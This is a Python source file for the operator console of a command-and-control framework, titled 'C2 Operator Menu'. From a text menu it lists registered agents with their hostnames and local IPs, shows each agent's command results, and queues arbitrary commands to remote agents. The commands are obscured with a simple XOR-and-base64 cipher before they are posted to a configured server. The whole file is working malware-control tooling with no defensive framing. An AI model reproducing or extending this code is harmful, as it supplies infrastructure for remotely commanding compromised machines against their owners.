import requests
import sys
import json
import base64

with open("config.json") as f:
    cfg = json.load(f)

SERVER_URL = f"http://{cfg['server_host']}:{cfg['server_port']}"
CRYPTO_KEY = cfg.get("crypto_key", "secret")

# Colors
GREEN  = "\033[92m"
RED    = "\033[91m"
BLUE   = "\033[94m"
YELLOW = "\033[93m"
RESET  = "\033[0m"

def xor(data: str, key=CRYPTO_KEY) -> str:
    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def encrypt(data: str, key=CRYPTO_KEY) -> str:
    return base64.b64encode(xor(data, key).encode()).decode()

def list_agents():
    try:
        response = requests.get(f"{SERVER_URL}/agents", timeout=10)
        response.raise_for_status()
        data = response.json()

        print(RED + "---- Agents ----" + RESET)
        if not data:
            print("No agents registered.")
            return
        for count, a in enumerate(data, start=1):
            print(f"{count}: {a['agent_id']} ({a['status']})")
    except Exception as e:
        print(RED + f"Error fetching agents: {e}" + RESET)


def show_agent():
    agent_id = input("Enter agent ID: ").strip()
    try:
        response = requests.get(f"{SERVER_URL}/agents/{agent_id}", timeout=10)
        if response.status_code != 200:
            print(RED + f"Agent {agent_id} not found." + RESET)
            return

        data = response.json()
        print(YELLOW + f"Agent: {data['Agent Id']}" + RESET)
        print(f" Hostname : {data['Hostname']}")
        print(f" Local IP : {data['Local IP']}")
        print(f" Status   : {data['Status']}")
        print(f" Last Seen: {data['Last Seen']}")

        print(BLUE + "\n--- Commands ---" + RESET)
        for cmd in data["Commands"]:
            print(f" [{cmd['Command Id']}] {cmd['Command']} -> {cmd['Status']}")
            if cmd["Result"]:
                print(f"   Result: {cmd['Result']}")
    except Exception as e:
        print(RED + f"Error fetching agent details: {e}" + RESET)


def send_command():
    agent_id = input("Enter agent ID: ").strip()
    command  = input("Enter command: ").strip()
    try:
        payload = {"agent_id": agent_id, "command": encrypt(command)}
        response = requests.post(f"{SERVER_URL}/queue", json=payload, timeout=10)

        if response.status_code == 200:
            data = response.json()
            print(GREEN + f"Queued command {data['command_id']} for {agent_id}" + RESET)
        else:
            print(RED + f"Failed to queue command (status {response.status_code})." + RESET)
    except Exception as e:
        print(RED + f"Error sending command: {e}" + RESET)


def list_tasks(status):
    try:
        response = requests.get(f"{SERVER_URL}/agents", timeout=10)
        response.raise_for_status()
        agents = response.json()

        print(BLUE + f"--- {status} tasks ---" + RESET)
        found = False
        for a in agents:
            detail = requests.get(f"{SERVER_URL}/agents/{a['agent_id']}", timeout=10).json()
            for cmd in detail["Commands"]:
                if cmd["Status"] == status:
                    found = True
                    print(f"Agent {a['agent_id']} -> [{cmd['Command Id']}] {cmd['Command']}")
        if not found:
            print("No tasks with that status.")
    except Exception as e:
        print(RED + f"Error listing tasks: {e}" + RESET)


def main():
    while True:
        print(GREEN + "\n--- C2 Operator Menu ---" + RESET)
        print(BLUE + "1. List agents")
        print("2. Show agent details with commands and results")
        print("3. Send command to agent")
        print("4. List queued tasks")
        print("5. List completed tasks")
        print("6. Exit" + RESET)

        choice = input("Select an option: ").strip()
        print("\n")

        if choice == "1":
            list_agents()
        elif choice == "2":
            show_agent()
        elif choice == "3":
            send_command()
        elif choice == "4":
            list_tasks("Queued")
        elif choice == "5":
            list_tasks("Completed")
        elif choice == "6":
            print("Exiting...")
            sys.exit(0)
        else:
            print("Invalid option. Try again.")


if __name__ == "__main__":
    main()
